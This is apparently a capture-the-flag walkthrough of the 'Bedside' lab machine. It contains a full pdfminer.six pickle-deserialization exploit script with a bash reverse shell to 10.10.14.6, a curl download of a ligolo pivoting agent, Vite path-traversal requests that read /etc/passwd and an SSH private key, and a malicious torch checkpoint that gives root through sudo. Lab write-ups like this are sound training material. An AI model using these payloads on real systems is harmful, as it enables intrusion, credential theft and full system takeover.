# Bedside

<figure><img src=".gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.51.43

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/bedside_tcp.htb $ip
# 22/tcp open  ssh
# 80/tcp open  http



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/bedside_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/bedside_udp.htb $ip
```

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts and and discover the web app**

{% code overflow="wrap" %}
```bash
echo "$ip bedside.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 3**</mark>

**I start Fuzzing i discovered this javaendpoint**

{% code overflow="wrap" %}
```bash
feroxbuster -u http://bedside.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,txt,bak,sql,js,html,zip,tar.gz,old,save \
  -r --depth 3 \
  --collect-words \
  --extract-links \
  --auto-tune \
  -t 50 \
  -s 200 204 301 302 307 401 403 500
  
  # 200      GET    10907l    44549w   289782c http://bedside.htb/javascript/jquery/jquery
```
{% endcode %}

**The way we see it like that because they use Apache MultiViews (Content Negotiation) is enabled**

**Apache automatically searched the directory for any file starting with**

**I review the file in details but it seems a dead end i cant found anything interesting**

{% code overflow="wrap" %}
```bash
DEFAULT_SIZE=$(curl -s -o /dev/null -w "%{size_download}" http://bedside.htb) && echo -e "\n[+] Default response size detected: $DEFAULT_SIZE bytes. Starting scan...\n" && ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs $DEFAULT_SIZE -mc 200,302,401,403,500 -t 100 -rate 500

# research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 92ms]
```
{% endcode %}

<mark style="color:blue;">**Step 4**</mark>&#x20;

**we have an upload functionnality lets try to upload a php webshell**

<figure><img src=".gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

**i bypass the file extensions error then i receve this MYME-TYPE error, and also we know the uplaod path in /uploads, so we work to bypass the MYME-TYPE**

**i was tryin this but i lately see this in the headers:&#x20;**<mark style="color:red;">**X-Powered-By: pdfminer.six**</mark>

**The `pdfminer.six` library has a known critical vulnerability that perform insecure deserialization**

**then after tryin multipe time i build this exploit that it worked**

{% code overflow="wrap" %}
```python
import pickle
import gzip
import requests


class RCE:
    def __reduce__(self):

        cmd = """__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.6/9001 0>&1"')"""
        return (eval, (cmd,))

with gzip.open('shell.pickle.gz', 'wb') as f:
    pickle.dump(RCE(), f)
print("[+] Created shell.pickle.gz")
path = "/var/www/research.bedside.htb/uploads/shell"
hex_path = "".join(f"#{ord(c):02x}" for c in path)

pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
100 700 Td
(Malicious PDF) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /{hex_path}
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >>
endobj
7 0 obj
<< /Type /FontDescriptor /FontName /MaliciousFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<< /Size 8 /Root 1 0 R >>
startxref
871
%%EOF
"""

with open('exploit.pdf', 'wb') as f:
    f.write(pdf_content.encode())
print("[+] Created exploit.pdf")


url = "http://research.bedside.htb/"

print("[*] Uploading shell.pickle.gz...")
with open('shell.pickle.gz', 'rb') as f:
    r1 = requests.post(url, files={'uploadFile': ('shell.pickle.gz', f, 'application/gzip')})
    if "successfully" in r1.text:
        print("[+] shell.pickle.gz uploaded!")

print("[*] Uploading exploit.pdf to trigger RCE...")
print("[!] CHECK YOUR NETCAT LISTENER NOW!")
with open('exploit.pdf', 'rb') as f:
    r2 = requests.post(url, files={'uploadFile': ('exploit.pdf', f, 'application/pdf')})
    if "successfully" in r2.text:
        print("[+] exploit.pdf uploaded! Triggering deserialization...")

```
{% endcode %}

{% code overflow="wrap" %}
```bash
# [+] Created shell.pickle.gz
# [+] Created exploit.pdf
# [*] Uploading shell.pickle.gz...
# [+] shell.pickle.gz uploaded!
# [*] Uploading exploit.pdf to trigger RCE...
# [!] CHECK YOUR NETCAT LISTENER NOW!
# [+] exploit.pdf uploaded! Triggering deserialization...

listener 9001
datawrangler@data-wrangler:/app$
```
{% endcode %}

{% hint style="info" %}
**Instead of trying to trick the web server (Apache) into executing a file, we tricked the backend application (Python) into executing our code&#x20;**_**in memory**_**.The massive clue was this HTTP header:**

> **`X-Powered-By: pdfminer.six`**

**This told us the backend uses a Python library called `pdfminer.six` to process uploaded PDFs (likely to extract text for "AI training", as the website claimed).**
{% endhint %}

{% hint style="warning" %}
1. **We uploaded `shell.pickle.gz`. The server saved it to `/var/www/research.bedside.htb/uploads/shell.pickle.gz`.**
2. **We uploaded `exploit.pdf`.**
3. **The backend Python script received the PDF and passed it to `pdfminer.six` to process.**
4. **`pdfminer.six` read the PDF, saw the custom `/Encoding` path, and said:&#x20;**_**"Ah, I need to load the character map for this font."**_
5. **The Fatal Flaw: The library blindly took the path from the PDF, appended `.pickle.gz` to it, and tried to load `/var/www/research.bedside.htb/uploads/shell.pickle.gz`.**
6. **It used `pickle.load()` to read the file.**
7. **Python triggered the `__reduce__` method, executing your `bash` reverse shell command.**
8. **Because the Python script is running as the web server user (`www-data`), the reverse shell connected back to our Netcat listener as `www-data`.**
{% endhint %}

<mark style="color:blue;">**Step 6**</mark>

**i cant  see process or either anything we can be on a minimal chroot bash or a docker isntance i confirm we are in docker**

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# then CTRL+Z
stty raw -echo; fg
# hit ENTER twice
export TERM=xterm

ls -la /
# -rwxr-xr-x   1 root         root       0 Nov 11  2025 .dockerenv

df -h
# overlay         9.5G  3.4G  6.0G  37% /
# /dev/sda4       9.5G  3.4G  6.0G  37% /datastore
```
{% endcode %}

**I think they're accidentaly exposed the /datastore i think it can be our entry point to escape docker**

<mark style="color:blue;">**Step 7**</mark>&#x20;

**i use a took to enumrate well the docker contaienr am into**

{% code overflow="wrap" %}
```bash
./cdk_linux_amd64_thin evaluate
./cdk_linux_amd64_thin run mount-disk

# [  Information Gathering - Net Namespace  ]
# host unix-socket found, seems container started with --net=host privilege.
```
{% endcode %}

**This look good because the container is sharing the Host Machine's network and process list**

**So i start by an internal scanning on open ports**

{% code overflow="wrap" %}
```bash
for port in 80 443 3000 4000 5000 6000 7000 8000 8080 8443 9000 9090; do
  (echo > /dev/tcp/127.0.0.1/$port) 2>/dev/null && echo "Port $port is OPEN"
done
# Port 80 is OPEN
# Port 3000 is OPEN
```
{% endcode %}

**Lets forward it  using ligolo**

{% code overflow="wrap" %}
```bash
# target
curl http://10.10.14.6/agent -o agent
chmod +x agent

# on kali 
./proxy -selfcert -laddr 0.0.0.0:11601

# on target
nohup ./agent -connect 10.10.14.6:11601 -ignore-cert > /dev/null 2>&1 &
interface_create --name "ligolo"
interface_add_route --name ligolo --route 240.0.0.1/32
start --tun ligolo
```
{% endcode %}

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**This is a React‑based single‑page web application that acts as a medical image viewer**

**In source page we found /@hmr**

* **The `/@hmr` and HMR script suggest the server may be running Vite or a similar dev server that enables hot reloading.**

**Visiting** [**http://240.0.0.1:3000/@hmr**](http://240.0.0.1:3000/@hmr)

**we confirm that it's a Vite’s Hot Module Replacement client**

**After searching i found that it can be vulnerable to path traversal so i try testing multipe payload until i found it**&#x20;

{% code overflow="wrap" %}
```bash
curl --path-as-is http://240.0.0.1:3000/../../../../etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
.....
# developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
```
{% endcode %}

**So i will target the developper user and try to leak his SSH key**&#x20;

{% code overflow="wrap" %}
```bash
curl --path-as-is http://240.0.0.1:3000/../../../..//home/developer/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----

chmod 600 id_rsa
ssh -i id_rsa  developer@$ip
developer@bedside:~$ id
# uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
```
{% endcode %}

<mark style="color:blue;">**Step 8**</mark>

**So now let's elevate our privs**

{% code overflow="wrap" %}
```bash
ss -tulnp 
# tcp      LISTEN    0         4096             127.0.0.1:33661             0.0.0.0:*

nc -v 240.0.0.1 33661
(UNKNOWN) [240.0.0.1] 33661 (?) open

# HTTP/1.1 400 Bad Request
# Content-Type: text/plain; charset=utf-8
# Connection: close
```
{% endcode %}

{% code overflow="wrap" %}
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   # sorts by mtime, picks newest
loader = CheckpointLoader(
    load_path=str(latest_ckpt),
    load_dict={"model": model, "optimizer": optimizer},
    map_location=DEVICE
)
loader(engine)   # ← this invokes torch.load() → executes pickle payload
```
{% endcode %}

* **The checkpoint directory is `/datastore/checkpoints/` (writeable by the `developer` user?).**
* **The script picks the most recently modified `.pt` file.**
*   **If we can write a malicious `.pt` there, and make it the newest, the next `sudo` run will trigger code execution as root.**



{% code overflow="wrap" %}
```bash
# from the container shell
echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > /datastore/processed/dummy.png 
chmod 755 /datastore
ls -ld /datastore
# drwxr-xr-x 9 datawrangler dataops 4096 Jul 19 16:01 /datastore

# from the developer ssh shell
pip show torch
# Version: 2.5.0+cpu
python3 -c '
import torch, os
class RCE:
    def __reduce__(self):
        return (os.system, ("bash -c \"bash -i >& /dev/tcp/10.10.14.6/9999 0>&1\"",))
torch.save({"model": RCE()}, "/datastore/checkpoints/pwn.pt")
print("[+] Payload created!")
'
# [+] Payload created!
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py


# kali
listener 9999
root@bedside:/home/developer# id
# uid=0(root) gid=0(root) groups=0(root)
```
{% endcode %}

<br>
